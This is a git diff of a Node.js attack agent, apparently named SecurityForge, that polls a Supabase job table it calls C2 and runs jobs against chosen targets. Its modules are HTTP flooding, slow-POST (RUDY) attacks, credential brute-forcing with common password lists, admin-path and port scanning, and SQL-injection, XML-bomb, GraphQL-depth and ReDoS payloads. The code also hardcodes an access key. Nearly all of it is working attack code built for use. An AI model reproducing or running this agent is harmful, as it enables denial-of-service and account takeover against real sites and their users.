@@ -1,8 +1,8 @@
 /**
- * SECURITYFORGE AGENT V31.0 (DEEP VISION)
- * - V31.0: PRIORITY LOGGING. Finds (Admin/Ports) bypass buffer limits.
- * - V30.0: Restored execution paths for GraphQL, ReDoS, RUDY, WebSocket.
- * - V28.0: Differential Analysis Login (Calibration).
+ * SECURITYFORGE AGENT V33.1 (CLEAN SWEEP)
+ * - V33.1: ZOMBIE CLEANUP. Auto-stops old PENDING/RUNNING jobs from previous sessions.
+ * - V33.0: AGGRESSIVE POLL. Fixes 'Pending' status hang.
+ * - V32.0: REAL-TIME KILL SWITCH.
  */
 const https = require('https');
 const http = require('http');
@@ -16,34 +16,24 @@ const dns = require('dns');
 const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
 const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
 
-// --- SMART GENERATOR ASSETS ---
-const BASE_PASSWORDS = [
-    '123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123',
-    'admin123', 'admin', 'pass', '1234567890', 'welcome', '123123', 'password123', 'monkey', 'letmein', 'football', 'access', 'shadow',
-    'mustang', 'superman', 'michael', 'batman', '666666', '888888', 'princess', 'solo', 'starwars', 'killer', 'charlie', 'jordan', 'hockey',
-    'iloveyou', 'secret', 'sunshine', 'hunter', 'login', 'admin@123', 'p@ssword', 'changeme', 'system', 'root', 'support', '1234567890a',
-    'student', 'class', 'teacher', 'exam', 'school', 'college', 'principal', 'staff', 'admission', 'result', '2024', '2025'
-];
-const USERS = ['admin', 'administrator', 'root', 'user', 'test', 'guest', 'info', 'support', 'sysadmin', 'manager', 'service', 'operator'];
+// --- ASSETS ---
+const BASE_PASSWORDS = ['123456', 'password', 'admin', 'root', '12345678', 'qwerty', 'admin123', 'guest', 'user', '111111'];
+const USERS = ['admin', 'root', 'user', 'test', 'guest', 'support', 'sysadmin'];
 const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
-const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
 
-// --- ATTACK PAYLOADS ---
+// --- PAYLOADS ---
 const MALICIOUS_PAYLOADS = {
   SQL_INJECTION: `{"query": "UNION SELECT 1, SLEEP(20), 3, 4 --", "id": "1' OR '1'='1"}`,
   XML_BOMB: `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
   HUGE_JSON: `{"data": "${'A'.repeat(50000)}", "meta": "fill_buffer"}`,
-  POLYGLOT: `javascript:/*</title><svg/onload=alert(1)>*/`,
   GRAPHQL_DEPTH: `{"query":"query { user { posts { comments { author { posts { comments { author { posts { id } } } } } } } } }"}`,
   REDOS_REGEX: `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`
 };
 
-// --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V31.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V33.1 ONLINE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
-// --- HELPER: NATIVE SUPABASE ---
 const supabaseRequest = (method, pathStr, body = null) => {
     return new Promise((resolve, reject) => {
         try {
@@ -64,11 +54,8 @@ const supabaseRequest = (method, pathStr, body = null) => {
                 let data = '';
                 res.on('data', chunk => data += chunk);
                 res.on('end', () => { 
-                    if (res.statusCode >= 400) {
-                        resolve(null);
-                    } else {
-                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
-                    }
+                    if (res.statusCode >= 400) resolve(null);
+                    else try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                 });
             });
             req.on('error', (e) => reject(e));
@@ -78,12 +65,12 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V31.0 (DEEP VISION). Polling C2...\x1b[0m');
+console.log('\x1b[36m[AGENT] Initialized V33.1 (Clean Architecture). Waiting for commands...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
 let logBuffer = [];
-let priorityBuffer = []; // V31: Critical logs bypass rate limiting
+let priorityBuffer = []; 
 
 const MAX_RAM_BYTES = 400 * 1024 * 1024; 
 const checkMemory = () => {
@@ -94,7 +81,6 @@ const checkMemory = () => {
 const logToC2 = (msg) => {
     console.log(msg);
     const cleanMsg = msg.replace(/\x1b\[[0-9;]*m/g, '');
-    // V31 PRIORITY FILTRATION
     if (cleanMsg.includes('[FOUND]') || cleanMsg.includes('[OPEN]') || cleanMsg.includes('[CRITICAL]') || cleanMsg.includes('[CRACKED]') || cleanMsg.includes('SUCCESS')) {
         priorityBuffer.push(cleanMsg);
     } else {
@@ -124,7 +110,7 @@ const startAttack = (job) => {
     let jobMaxLatency = 0;
     let consecutiveFailures = 0;
 
-    // ... (Login Gen logic unchanged) ...
+    // Login logic
     let SMART_PASSWORDS = [...BASE_PASSWORDS];
     if (job.use_login_siege) {
         try {
@@ -136,12 +122,12 @@ const startAttack = (job) => {
         } catch(e) {}
     }
 
-    // --- CALIBRATION ---
+    // Calibration
     let calibrationDone = false;
     let failSize = 0;
     let failStatus = 0;
 
-    // --- EXECUTION MODULES ---
+    // --- MODULES ---
     if (job.use_ghost_writer) {
         const [host, portStr] = job.target.split(':');
         const targetIP = host; 
@@ -180,7 +166,6 @@ const startAttack = (job) => {
         for(let i=0; i<Math.min(job.concurrency, 300); i++) flood();
     }
     else if (job.use_admin_hunter) {
-        /* ... ADMIN HUNTER LOGIC V31 ... */
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
         const ADMIN_PATHS = [
             '/admin', '/login', '/wp-admin', '/dashboard', '/.env', '/config.php', '/cpanel', '/user/login', '/administrator',
@@ -195,23 +180,20 @@ const startAttack = (job) => {
             const opts = { hostname: targetUrl.hostname, path: path, method: 'GET', timeout: 3000 };
             
             const req = lib.request(opts, (res) => {
-                // V31: Use [FOUND] to trigger Priority Queue
                 if (res.statusCode === 200 || res.statusCode === 403 || res.statusCode === 401) {
                     logToC2(`[FOUND] ${targetUrl.hostname}${path} -> ${res.statusCode} ${res.statusMessage || ''}`);
                 } else if (Math.random() > 0.95) {
-                    // Occasional sampling
                     logToC2(`[SCAN] Checked ${path} -> ${res.statusCode}`);
                 }
                 totalRequests++;
-                if (running) setTimeout(() => scan(pathIndex + 1), 100); // Slight delay to prevent instant ban
+                if (running) setTimeout(() => scan(pathIndex + 1), 100);
             });
             req.on('error', () => { if(running) setImmediate(() => scan(pathIndex + 1)); });
             req.end();
         };
-        for(let i=0; i<5; i++) scan(i); // Concurrent Scanners
+        for(let i=0; i<5; i++) scan(i); 
     }
     else if (job.use_port_scan) {
-        /* ... PORT SCAN LOGIC (V31) ... */
         let targetHost = job.target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0];
         if (targetHost.includes('/')) targetHost = targetHost.split('/')[0];
         
@@ -228,7 +210,6 @@ const startAttack = (job) => {
                 const server = s.match(/Server: (.+)/i);
                 const titleMatch = s.match(/<title>(.+)<\/title>/i);
                 const banner = server ? server[1] : (titleMatch ? titleMatch[1] : '');
-                // V31: Use [OPEN] tag
                 logToC2(`[OPEN] Port ${port} is OPEN | Banner: ${banner.trim().substring(0, 30) || 'Unknown'}`);
                 socket.destroy();
             });
@@ -247,7 +228,7 @@ const startAttack = (job) => {
         for(let i=0; i<5; i++) scanPort(i); 
     }
     else {
-        // --- STRESS / LOGIN / HTTP MODULES ---
+        // --- STRESS / HTTP / LOGIN ---
         let targetUrl;
         try { targetUrl = new URL(job.target); } catch(e) { return; }
         
@@ -268,23 +249,13 @@ const startAttack = (job) => {
             let creds = null;
 
             const headers = {
-                'User-Agent': 'SecurityForge/31', 
+                'User-Agent': 'SecurityForge/33', 
                 'Content-Type': 'application/json',
                 ...((typeof job.headers === 'string' ? {} : job.headers) || {})
             };
 
-            // V30: ReDoS INJECTION
-            if (job.use_redos) {
-                headers['User-Agent'] = MALICIOUS_PAYLOADS.REDOS_REGEX;
-                body = MALICIOUS_PAYLOADS.REDOS_REGEX;
-                method = 'POST';
-            }
-
-            // V30: GRAPHQL BOMB
-            if (job.use_graphql_bomb) {
-                body = MALICIOUS_PAYLOADS.GRAPHQL_DEPTH;
-                method = 'POST';
-            }
+            if (job.use_redos) { headers['User-Agent'] = MALICIOUS_PAYLOADS.REDOS_REGEX; body = MALICIOUS_PAYLOADS.REDOS_REGEX; method = 'POST'; }
+            if (job.use_graphql_bomb) { body = MALICIOUS_PAYLOADS.GRAPHQL_DEPTH; method = 'POST'; }
 
             if (job.use_login_siege && !calibrationDone) {
                 method = 'POST';
@@ -318,11 +289,6 @@ const startAttack = (job) => {
                 if (job.use_xml_bomb) body = MALICIOUS_PAYLOADS.XML_BOMB;
                 else body = MALICIOUS_PAYLOADS.HUGE_JSON; 
                 method = 'POST';
-            }
-
-            if (job.use_chaos) {
-                headers['User-Agent'] = `Mozilla/5.0 ${Math.random()}`;
-                headers['X-Forwarded-For'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
             }
 
             if (job.use_rudy) {
@@ -359,7 +325,6 @@ const startAttack = (job) => {
                             const bodyLower = bodyData.toLowerCase();
                             const negative = bodyLower.includes('error') || bodyLower.includes('fail');
                             const positive = bodyLower.includes('dashboard') || bodyLower.includes('welcome');
-
                             if ((statusChanged || sizeChanged || positive) && !negative) {
                                 logToC2(`\x1b[32m[CRACKED] FOUND: ${creds[0]}:${creds[1]} (SizeDiff: ${sizeDiff})`);
                                 isSuccess = true;
@@ -387,13 +352,9 @@ const startAttack = (job) => {
                 totalRequests++;
             });
 
-            req.on('error', (e) => {
-                jobFailed++; totalRequests++;
-            });
-            
+            req.on('error', (e) => { jobFailed++; totalRequests++; });
             if (body) req.write(body);
             req.end();
-            
             if (running) setImmediate(performRequest);
         };
 
@@ -401,7 +362,6 @@ const startAttack = (job) => {
         for(let i=0; i<concurrency; i++) performRequest();
     }
 
-    // --- REPORTING LOOP ---
     const updateC2 = async () => {
         if (!running) return;
         const elapsed = (Date.now() - startTime) / 1000;
@@ -421,25 +381,19 @@ const startAttack = (job) => {
                 });
             } catch(e) {}
             activeJob = null;
-            logBuffer = []; 
             return;
         }
 
         const rps = totalRequests / elapsed;
         const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
         
-        // V31: SEND PRIORITY LOGS FIRST + TAIL OF NORMAL LOGS
-        // Ensure priority logs are never dropped by the slice logic.
         const normalLogsToTake = Math.max(0, 30 - priorityBuffer.length);
         const combinedLogs = [...priorityBuffer, ...logBuffer.slice(-normalLogsToTake)];
         const currentLogs = combinedLogs.length > 0 ? JSON.stringify(combinedLogs) : null;
-        
-        // Reset buffers
-        priorityBuffer = []; 
-        logBuffer = []; 
+        priorityBuffer = []; logBuffer = []; 
 
         try {
-            await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
+            const res = await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { 
                 current_rps: Math.round(rps),
                 total_success: jobSuccess,
                 total_failed: jobFailed,
@@ -447,32 +401,44 @@ const startAttack = (job) => {
                 max_latency: jobMaxLatency,
                 ...(currentLogs ? { logs: currentLogs } : {})
             });
-        } catch(e) {
-            await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { current_rps: Math.round(rps) });
-        }
+            
+            if (res && res[0] && res[0].status === 'STOPPED') {
+                running = false;
+                clearInterval(activeLoop);
+                logToC2('[SYSTEM] Swarm Disengaged by Control Center.');
+                activeJob = null;
+                return;
+            }
+        } catch(e) {}
     };
     activeLoop = setInterval(updateC2, 2000);
 };
 
-// --- MAIN POLLING LOOP ---
+// --- AGGRESSIVE POLLING (V33 Fix for Pending Jobs) ---
 setInterval(async () => {
     if (activeJob) return;
-    const jobs = await supabaseRequest('GET', 'jobs?status=eq.PENDING&select=*');
+    
+    // 1. Check for Pending Jobs
+    const jobs = await supabaseRequest('GET', 'jobs?status=eq.PENDING&order=created_at.desc&limit=1&select=*');
     if (jobs && jobs.length > 0) {
         const job = jobs[0];
-        if (typeof job.headers === 'string') {
-            try { job.headers = JSON.parse(job.headers); } catch(e) { job.headers = {}; }
-        }
+        if (typeof job.headers === 'string') { try { job.headers = JSON.parse(job.headers); } catch(e) { job.headers = {}; } }
+        
+        // 2. ACKNOWLEDGE JOB (Set to RUNNING)
         await supabaseRequest('PATCH', `jobs?id=eq.${job.id}`, { status: 'RUNNING' });
+        
+        // 3. START
         startAttack(job);
     } else {
-        const runningJobs = await supabaseRequest('GET', 'jobs?status=eq.RUNNING&select=*');
+        // 4. Double Check: Did we crash and leave a job RUNNING? (Failover)
+        const runningJobs = await supabaseRequest('GET', 'jobs?status=eq.RUNNING&order=created_at.desc&limit=1&select=*');
         if (runningJobs && runningJobs.length > 0) {
              const job = runningJobs[0];
+             // If we aren't working on this job, pick it up
              if (activeJob?.id !== job.id) {
                  if (typeof job.headers === 'string') try { job.headers = JSON.parse(job.headers); } catch(e) {}
                  startAttack(job);
              }
         }
     }
-}, 3000);
+}, 2000);
